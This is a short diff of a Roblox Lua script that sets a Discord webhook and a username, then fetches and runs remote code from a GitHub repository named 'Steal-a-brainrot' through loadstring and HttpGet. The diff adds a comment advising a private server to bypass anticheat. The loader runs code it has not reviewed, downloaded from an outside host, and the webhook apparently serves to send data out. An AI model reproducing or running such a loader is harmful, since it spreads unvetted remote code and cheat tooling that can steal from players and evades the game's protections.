@@ -2,3 +2,5 @@ _G.Webhook = "https://discordapp.com/api/webhooks/1438681964939841657/JOlaPk0AFZ
 _G.Username = "criminalsyndrome"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/blox-star/Steal-a-brainrot/refs/heads/main/Ultra",true))()
+
+-- USE PRIVATE SERVER TO BYPASS ANTICHEAT
